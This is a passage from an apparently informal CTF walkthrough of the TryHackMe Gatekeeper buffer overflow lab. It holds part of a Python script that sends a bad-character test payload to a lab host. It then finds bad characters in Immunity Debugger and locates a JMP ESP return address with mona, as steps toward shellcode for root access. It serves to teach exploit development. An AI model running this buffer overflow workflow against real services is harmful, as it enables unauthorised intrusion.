b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

try:            
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',31337))
        s.send(gate_string + badchars + b'\r\n')
        s.close()

except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169661089-55e221d8-b349-4af4-a434-021938bee1a0.png)

- Execute it! Que chille!!!

    - ![image](https://user-images.githubusercontent.com/94720207/169661162-93b97210-e0e8-4b1b-86c6-d99534f1d512.png)

    - The program crashes, that's perfect! let's see `Immunity Debugger` and send `ESP` to follow in dump (bottom left corner) 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169593293-0d3b0763-2978-4e96-81f3-45dcc1b72d25.png)

- Now, let's take a look at the dump (bottom left corner):
    
    - ![image](https://user-images.githubusercontent.com/94720207/169661713-5dfcd752-8d3c-45e6-8511-319fe51059e8.png)
    
    - **It's easy to read it, it's just a sequence number going: 1,2,3,4,5,6,7,8,9,10<---- but in HEX...**
    
        - This means:

            - We are looking for a bad char in between all that sequence, if any number is missing on the sequence, then, it means that char is being used and it's a `bad char`, just like that...
        
            - **In this Lab of `Gatekeeper`, there are 2 different `badchars`!!! 
            
            - Null byte, a default badchar `\x00` 
            
            - `\x0A` Is missing, so it's another `badchar` 
        
            - In technic words, we are specting all that characters to happen except for `\x0A`.
            
            - The last thing we sent was `FF`, so if we search for `FF` at the end of the list, that means that we need to search only from the beginning to `FF`.
    
    - **Write down all this numbers, because we need them to generate the final shellcode to gain root!!!**
    
---

### Finding the right module

- Finding the right module means that we are looking for a `.dll` or something similar inside our program (gatekeeper) that has no memory protections.  

- Once everything is ready, we can start `vuln server` and `Immunity Debugger`, attach the program, etc.

    - **To use `Mona Modules`, the only extra thing to do now is typingon the bottom bar before `play` it:
    
        - `!mona modules` (and hit >Enter<) 

        - ![image](https://user-images.githubusercontent.com/94720207/169662445-1da8ac9e-753d-401f-bdda-466495ba1a9b.png)
        
            - **We are looking for something attached to gatekeeper, but we only have the .exe vulnerable, so there are not modules like in other Labs, so I will jump to the badchars with a new `mona` command that makes all easier. 

- **Jump time**

- Once in the `Immunity Debugger` we will type:

    -  `!mona jmp -r esp -cpb "\x00\x0a"`
        
    - ![image](https://user-images.githubusercontent.com/94720207/169662658-074bdd74-0f00-443d-a18a-b27a8065c846.png)
    
        - We are searching here a `return address`
        
        - For example, the first row means the `retrun addresses`, so, if we start from the top we found:
        
            - **Return Address = `080416BF`** 

- **In Kali Machine**




---

### References

- https://steflan-security.com/tryhackme-gatekeeper-walkthrough/
- https://github.com/hamza07-w/gatekeeper-tryHackme-writeup
